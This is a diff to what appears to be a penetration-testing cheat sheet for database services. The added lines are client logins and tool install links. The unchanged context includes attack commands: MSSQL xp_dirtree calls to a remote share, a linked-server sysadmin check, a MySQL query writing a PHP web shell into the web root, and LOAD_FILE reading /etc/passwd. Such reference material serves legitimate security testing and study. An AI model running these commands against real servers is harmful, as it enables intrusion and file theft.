@@ -347,7 +347,8 @@ $ export WEBKIT_FORCE_SANDBOX=0 && evolution
 
 ```
 $ python3 mssqlclient.py <domain>/<username>@<IP address> -windows-auth
-$ sqlcmd -S SRVMSSQL\SQLEXPRESS -U <username> -P '<password>' -y 30 -Y 30
+C:\> sqlcmd -S SRVMSSQL\SQLEXPRESS -U <username> -P '<password>' -y 30 -Y 30
+C:\> sqlcmd -S <IP address> -U <username> -P '<password>' -y 30 -Y 30
 $ sqsh -S <IP address> -U <username> -P '<password>' -h
 $ sqsh -S <IP address> -U .\\<username> -P '<password>' -h
 SQL> SELECT name FROM master.dbo.sysdatabases
@@ -365,6 +366,8 @@ SQL> EXEC master..xp_dirtree '\\<IP address>\share\'
 SQL> EXEC master..xp_subdirs '\\<IP address>\share\'
 SQL> SELECT srvname, isremote FROM sysservers
 SQL> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<IP address>\SQLEXPRESS]
+https://learn.microsoft.com/en-us/ssms/install/install
+sudo dpkg -i dbeaver-<version>.deb && dbeaver &        # https://github.com/dbeaver/dbeaver, https://www.youtube.com/watch?v=gU6iQP5rFMw
 ```
 
 - Oracle TNS (port 1521)
@@ -423,6 +426,8 @@ MySQL [(none)]> SELECT * from <table name> where <column> = "<string>";
 MySQL [(none)]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'
 MySQL [(none)]> show variables like "secure_file_priv";
 MySQL [(none)]> select LOAD_FILE("/etc/passwd");
+https://dev.mysql.com/downloads/workbench/
+sudo dpkg -i dbeaver-<version>.deb && dbeaver &        # https://github.com/dbeaver/dbeaver, https://www.youtube.com/watch?v=PeuWmz8S6G8
 ```
 
 - RDP (port 3389)
